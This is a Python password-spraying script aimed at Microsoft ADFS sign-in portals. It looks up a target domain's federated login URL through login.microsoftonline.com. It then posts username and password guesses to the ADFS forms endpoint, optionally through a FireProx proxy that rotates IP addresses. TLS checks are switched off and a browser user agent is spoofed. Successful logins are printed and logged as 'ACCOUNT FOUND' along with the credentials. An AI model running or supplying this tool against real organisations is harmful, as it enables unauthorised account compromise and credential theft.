#!/usr/bin/env python3

# Heavily inspired from the work of ricardojoserf. His tool is much better than mine
import requests, warnings
import json, sys
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''Function for password spraying against ADFS portal'''
def adfs_conn(params):

	dafs_url = params.get('dafs_url')
	if "dafs" in dafs_url:
		origin_field  = dafs_url.split("adfs")[0]
	else:
		origin_field  = dafs_url

	if params.get("url"):
		fprox = params.get("url")
		fproxurl = fprox.split('/')[2]
		tempurl = dafs_url.split('/')
		dafs_url = 'https://' + fproxurl + '/fireprox/adfs/ls' + str(tempurl[5])
		targets= fproxurl
	else:
		targets= origin_field.split('/')[2]

	username = params.get("username")
	password = params.get("password")
	count = params.get("count")
	place = params.get("place")
	filelogger = params.get("filelogger")

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Origin': origin_field,
		'Connection': 'close',
		'Referer': dafs_url,
	}

	data = "UserName={}&Password={}&AuthMethod=FormsAuthentication".format(username,password)
	try:

		# print the host , username and password being checked
		print(f"ACCOUNT CHECK: [ADFS] Target: {targets} User: {username} [{place} of {count}, {place} completed] Password: {password}")

		query = requests.post(
			dafs_url, data=data, headers=headers, verify=False)

		for resp in query.history:
			if resp.status_code == 302:
				if resp.headers['Set-Cookie']:
					print(f"ACCOUNT FOUND: [ADFS] Target: {targets} User: {username} Password: {password} [SUCCESS]")
					if filelogger != None:
						filelogger.debug(f"ACCOUNT FOUND: [ADFS] Target: {targets} User: {username} Password: {password} [SUCCESS]") 
			elif query.status_code != 401:
				print(f"The Header Respose code to investigate: {query.status_code}")
	
	except:
		pass

def calculate_values(target):
	s = requests.Session()
	url = "https://login.microsoftonline.com/common/userrealm/?user=test@"+target+"&api-version=2.1&checkForMicrosoftAccount=true"
	headers = None
	response = s.get(url)
	json_data = json.loads(response.text)
	if 'AuthURL' in json_data:
		print("[+] Organization uses a customized sign-in page")
		dafs_url = s.get(json_data['AuthURL']).url #json_data['AuthURL']
	# elif (json_data['NameSpaceType'] == "Managed"):
	# 	print("[!] Organization does not use a customized sign-in page. \n[!] Using Microsoft Server ActiveSync")
	# 	dafs_url = active_sync_url
	else:
		print("[!] Error. Organization probably does not use Office 365.")
		print("[-] Response from login.microsoftonline.com:")
		print(json.dumps(json_data, indent=4, sort_keys=True))
		sys.exit(1)
	return dafs_url